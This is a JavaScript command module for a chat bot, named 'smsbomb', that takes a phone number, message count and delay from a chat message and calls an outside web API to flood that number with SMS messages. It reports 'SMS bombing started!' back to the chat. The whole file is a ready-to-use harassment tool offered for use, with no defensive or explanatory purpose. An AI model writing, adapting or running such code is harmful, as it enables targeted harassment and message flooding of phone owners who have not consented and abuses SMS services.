const axios = require('axios');

module.exports.config = {
  name: 'smsbomb',
  version: '1.0.0',
  role: 0,
  hasPrefix: false,
  aliases: ['smsbomb', 'bomb'],
  description: "SMS Bomber Command",
  usage: "smsbomb [phone] [amount] [cooldown]",
  credits: 'churchill',
  cooldown: 3,
};

module.exports.run = async function({ api, event, args }) {
  const [phone, amount, cooldown] = args;
  const responseDiv = { className: '', textContent: '' };

  if (!phone || !amount || !cooldown) {
    responseDiv.className = 'error';
    responseDiv.textContent = 'smsbomb phone amount cooldown';
    api.sendMessage(responseDiv.textContent, event.threadID, event.messageID);
    return;
  }

  responseDiv.textContent = 'Starting SMS bombing...';
  api.sendMessage(responseDiv.textContent, event.threadID, event.messageID);

  try {
    const response = await axios.get(`https://deku-rest-api-ywad.onrender.com/smsb`, {
      params: {
        number: phone,
        amount: amount,
        delay: cooldown
      }
    });
    const data = response.data;
    console.log('Response:', data);

    responseDiv.className = 'success';
    responseDiv.textContent = 'SMS bombing started!';
  } catch (error) {
    console.error('Error:', error);

    responseDiv.className = 'error';
    responseDiv.textContent = 'Error starting SMS bombing';
  }

  api.sendMessage(responseDiv.textContent, event.threadID, event.messageID);
};
